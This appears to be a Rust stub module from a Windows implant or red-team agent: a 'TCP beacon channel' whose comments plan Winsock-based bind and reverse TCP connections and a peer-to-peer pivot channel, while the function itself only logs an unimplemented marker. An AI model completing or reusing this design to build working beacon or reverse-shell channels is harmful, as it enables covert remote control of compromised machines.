//! TCP beacon channel — STUB (spec-3 will implement).
//!
//! spec-3 plan: Winsock (ws2_32) FFI for raw TCP. Supports both bind_tcp
//! (listen for incoming) and reverse_tcp (connect out). P2P pivot channel.
//! Server-side TCP beacon listener.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// STUB: returns None + diagnostic marker. spec-3 fills this in.
pub unsafe fn send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_TCP_UNIMPL");
    None
}
